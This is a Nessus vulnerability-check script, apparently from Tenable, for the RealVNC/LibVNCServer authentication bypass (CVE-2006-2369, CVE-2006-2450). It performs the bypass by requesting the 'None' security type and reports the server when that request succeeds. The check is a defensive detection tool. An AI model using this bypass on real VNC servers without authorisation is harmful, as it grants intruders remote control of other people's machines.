#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(21564);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2006-2369", "CVE-2006-2450");
  script_bugtraq_id(17978, 18977);
  script_xref(name:"OSVDB", value:"25479");
  script_xref(name:"OSVDB", value:"27137");

  script_name(english:"VNC Security Type Enforcement Failure Remote Authentication Bypass");
  script_summary(english:"Tries to bypass authentication using a type of None");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote VNC server is prone to an authentication bypass issue." );
 script_set_attribute(attribute:"description", value:
"The VNC server installed on the remote host allows an attacker
to bypass authentication by simply requesting 'Type 1 - None' as the
authentication type even though it is not explicitly configured to
support that." );
 script_set_attribute(attribute:"see_also", value:"http://www.intelliadmin.com/blog/2006/05/security-flaw-in-realvnc-411.html" );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2006-May/046039.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.realvnc.com/products/free/4.1/release-notes.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.realvnc.com/products/personal/4.2/release-notes.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.realvnc.com/products/enterprise/4.2/release-notes.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b71e7987" );
 script_set_attribute(attribute:"solution", value:
"If using RealVNC, upgrade to RealVNC Free Edition 4.1.2 / Personal Edition 4.2.3 /
Enterprise Edition 4.2.3 or later. 

If using LibVNCServer, upgrade to version 0.8.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"Misc.");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("vnc.nasl");
  script_require_ports("Services/vnc", 5900);
  exit(0);
}


include("byte_func.inc");


port = get_kb_item("Services/vnc");
if (!port) port = 5900;
if (!get_port_state(port)) exit(0);


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);


# nb: The RFB protocol is described at:
#     http://www.realvnc.com/docs/rfbproto.pdf


# Get the protocol version supported by the server.
s = recv(socket:soc, length:512, min:12);
if (strlen(s) < 12) exit(1);

v = eregmatch(pattern:'^RFB ([0-9]+)\\.([0-9]+)\n', string:s);
if (isnull(v)) exit(0);
ver_major = int(v[1]);
ver_minor = int(v[2]);
# nb: protocol versions before 3.7 don't allow the 
#     client to select the authentication type.
if (ver_major != 3 || ver_minor < 7) exit(1);


# Reply with same version.
send(socket:soc, data:s);


# Read the security types supported by the server.
types = NULL;
set_byte_order(BYTE_ORDER_BIG_ENDIAN);
s = recv(socket:soc, length:1, min:1);
if (strlen(s) == 1)
{
  n = ord(s);
  if (n > 0)
  {
    for (i=0; i<n; i++)
    {
      s = recv(socket:soc, length:1, min:1);
      if (isnull(types)) types = make_list(ord(s));
      else types = make_list(types, ord(s));
    }
  }
}


if (types)
{
  # Make sure authentication is required.
  auth_required = 1;
  foreach type (types)
    # nb: type == 0 => connection failed.
    if (type == 0) auth_required = 0;
    # nb: type == 1 => None is supported.
    else if (type == 1) auth_required = 0;

  # If it is...
  if (auth_required)
  {
    # Try to bypass authentication.
    send(socket:soc, data:mkbyte(1));

    # If the protocol is below 3.8, send a ClientInit and look for a ServerInit.
    if (ver_minor < 8)
    {
      # Set Shared-Flag to true.
      send(socket:soc, data:mkbyte(1));
      s = recv(socket:soc, length:128);
      # There's a problem if it looks like a ServerInit 
      if (
        strlen(s) >= 24 &&
        getdword(blob:s, pos:0x14) + 24 == strlen(s)
      ) security_hole(port);
    }
    # If the protocol is 3.8, check the SecurityResult message.
    else
    {
      s = recv(socket:soc, length:4, min:4);
      # There's a problem if it's an OK.
      if (s == mkdword(0)) security_hole(port);
    }
  }
}


close(soc);
